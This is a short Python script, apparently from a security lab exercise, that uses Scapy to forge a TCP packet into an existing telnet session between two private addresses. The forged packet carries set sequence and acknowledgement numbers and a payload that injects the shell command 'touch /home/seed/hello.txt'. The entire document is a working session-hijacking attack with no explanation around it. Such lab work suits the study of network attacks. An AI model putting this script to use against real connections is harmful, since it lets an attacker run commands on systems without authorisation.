#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=52598, dport=23, flags="A", seq=26621311, ack=3764282395)
data = "\n touch /home/seed/hello.txt\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)